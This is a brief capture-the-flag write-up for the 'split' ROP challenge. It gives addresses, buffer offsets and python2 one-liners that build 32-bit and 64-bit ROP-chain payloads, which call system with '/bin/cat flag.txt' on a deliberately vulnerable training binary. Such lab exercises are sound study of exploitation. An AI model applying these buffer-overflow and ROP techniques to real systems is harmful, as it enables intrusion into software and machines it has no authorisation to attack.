# Contents
- Task Description
- 32 bit
- 64 bit

## Task Description
The elements that allowed you to complete ret2win are still present, they've just been split apart.  
Find them and recombine them using a short ROP chain.

## 32 bit
File Checks
32 bit ELF with no canaries
To get the flag we need to create a chain where it first calls system and then /bin/cat flag.txt
/bin/cat flag.txt has a memory addr of 0x804a030
and for the system call it is 0x0804861a
The buffer size is 44 bytes

Generate the payload
```bash
python2 -c 'print "A"*44 +"\x1a\x86\x04\x08"+"\x30\xa0\x04\x08"' > payload
```

Then pass it in and get the flag
```flag
ROPE{a_placeholder_32byte_flag!}
```

## 64 bit
File checks
64 bit lsb
Find the sys call : 0x000000000040074b
Find cat call        : 0x0000000000601060
Find the buffer -> 40
For 64 bit instead of passing in things form the stack they need to be in the RDI
rop gadget         : 0x00000000004007c3

payload order is gadget bincat syscall
generate payload
```shell
python2 -c 'print "A"*40 +"\xc3\x07\x40\x00\x00\x00\x00\x00"+"\x60\x10\x60\x00\x00\x00\x00\x00"+"\x4b\x07\x40\x00\x00\x00\x00\x00"'>split64-payload
```

---
Creation date: 11-10-2022

Last modified date: Tuesday 25th October 2022
***
